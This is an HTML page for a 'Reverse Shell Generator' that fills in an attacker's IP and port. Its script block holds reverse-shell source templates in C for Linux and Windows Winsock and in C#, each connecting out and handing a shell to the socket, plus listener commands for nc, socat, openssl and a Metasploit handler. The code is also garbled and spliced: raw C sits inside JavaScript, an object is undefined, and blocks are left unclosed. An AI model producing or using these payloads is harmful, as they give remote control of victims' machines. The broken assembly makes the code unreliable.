<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Reverse Shell Generator</title>
<style>
  body {
    font-family: monospace, monospace;
    max-width: 700px;
    margin: 2rem auto;
    padding: 0 1rem;
    background: #1e1e1e;
    color: #c5c8c6;
  }
  label {
    display: block;
    margin: 1rem 0 0.25rem;
  }
  input, select, textarea {
    width: 100%;
    font-family: monospace;
    font-size: 1rem;
    padding: 0.4rem;
    background: #282a2e;
    color: #f8f8f2;
    border: 1px solid #444;
    border-radius: 4px;
    box-sizing: border-box;
  }
  textarea {
    resize: vertical;
  }
  h2, h3 {
    margin-top: 2rem;
  }
</style>
</head>
<body>

<h2>Reverse Shell Generator</h2>

<label for="ip">IP (LHOST):</label>
<input type="text" id="ip" placeholder="e.g. 192.168.1.10" />

<label for="port">Port (LPORT):</label>
<input type="number" id="port" placeholder="e.g. 4444" />

<label for="payloadType">Payload Type:</label>
<select id="payloadType">
  <option value="reverse">reverse</option>
  <option value="bind">bind</option>
  <option value="msfvenom">msfvenom</option>
  <option value="hoaxshell">hoaxshell</option>
</select>

<label for="payloadOption">Payload Option:</label>
<select id="payloadOption"></select>

<label for="listenerType">Listener Type:</label>
<select id="listenerType">
  <option value="nc">nc</option>
  <option value="rlwrap_nc">rlwrap + nc</option>
  <option value="socat">socat</option>
  <option value="socat_tty">socat (TTY)</option>
  <option value="openssl">openssl</option>
  <option value="busybox_nc">busybox nc</option>
  <option value="pwncat">pwncat</option>
  <option value="conpty">windows conpty</option>
  <option value="powercat">powercat</option>
  <option value="rustcat">rustcat</option>
  <option value="msfconsole">msfconsole</option>
  <option value="hoaxshell">hoaxshell</option>


</select>

<h3>Generated Payload:</h3>
<textarea id="generatedPayload" rows="6" readonly></textarea>

<h3>Listener Command:</h3>
<textarea id="generatedListener" rows="3" readonly></textarea>

<script>

#include <stdlib.h>

#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = ${port};
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("${ip}");

    dup2(sockt, 1);
    dup2(sockt, 2);

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 
char ip_addr[16] = "${ip}"; 
char port[6] = "${port}";            

STARTUPINFO ini_processo;

PROCESS_INFORMATION processo_info;

int main()
{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);


    struct hostent *host; 
    host = gethostbyname(ip_addr);
    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

        `using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient("${ip}", ${port}))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);
						
						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "sh";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}`,

  const listeners = {
    nc: (port) => `nc -lvnp ${port}`,
    hoaxshell: (port) => `hoaxshell -l ${port}`,
    socat: (port) => `socat TCP-LISTEN:${port},reuseaddr,fork EXEC:/bin/sh`,
    openssl: (port) => `openssl s_server -quiet -accept ${port} -nocert`,
    msfconsole: (port, ip) =>
      `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/shell_reverse_tcp; set LHOST ${ip}; set LPORT ${port}; exploit"`,
    rlwrap_nc: (port) => `rlwrap nc -lvnp ${port}`,
    wincon: (port) => `stty raw -echo; (stty size; cat) | nc -lvnp ${port}`,
    socat_tty: (port) =>
      `socat -d -d TCP-LISTEN:${port},reuseaddr,fork PTY,raw,echo=0`,

  const ipInput = document.getElementById("ip");
  const portInput = document.getElementById("port");
  const payloadTypeSelect = document.getElementById("payloadType");
  const payloadOptionSelect = document.getElementById("payloadOption");
  const listenerTypeSelect = document.getElementById("listenerType");
  const generatedPayloadArea = document.getElementById("generatedPayload");
  const generatedListenerArea = document.getElementById("generatedListener");

  function updatePayloadOptions() {
    const type = payloadTypeSelect.value;
    const options = Object.keys(payloads[type]);
    payloadOptionSelect.innerHTML = "";
    options.forEach((opt) => {
      const optionElem = document.createElement("option");
      optionElem.value = opt;
      optionElem.textContent = opt;
      payloadOptionSelect.appendChild(optionElem);
    });
  }

  function generate() {
    const ip = ipInput.value.trim();
    const port = portInput.value.trim();
    const payloadType = payloadTypeSelect.value;
    const payloadOption = payloadOptionSelect.value;
    const listenerType = listenerTypeSelect.value;

    if (!port || !payloads[payloadType] || !payloads[payloadType][payloadOption]) {
      generatedPayloadArea.value = "Invalid payload selection or missing port.";
      generatedListenerArea.value = "";
      return;
    }

    if (!ip && payloadType !== "bind" && payloadType !== "msfvenom") {
      // For some payloads IP is needed
      generatedPayloadArea.value = "Please enter a valid IP address.";
      generatedListenerArea.value = "";
      return;
    }

    const payloadFn = payloads[payloadType][payloadOption];
    const payload = payloadFn(ip, port);

    const listenerFn = listeners[listenerType];
    if (!listenerFn) {
      generatedListenerArea.value = "Invalid listener selection.";
      return;
    }
    const listener = listenerType === "msfconsole" ? listenerFn(port, ip) : listenerFn(port);

    generatedPayloadArea.value = payload;
    generatedListenerArea.value = listener;
  }

  // Update payload options on page load & when payload type changes
  updatePayloadOptions();
  payloadTypeSelect.addEventListener("change", () => {
    updatePayloadOptions();
    generate();
  });
  payloadOptionSelect.addEventListener("change", generate);
  listenerTypeSelect.addEventListener("change", generate);
  ipInput.addEventListener("input", generate);
  portInput.addEventListener("input", generate);

  // Initial generate
  generate();
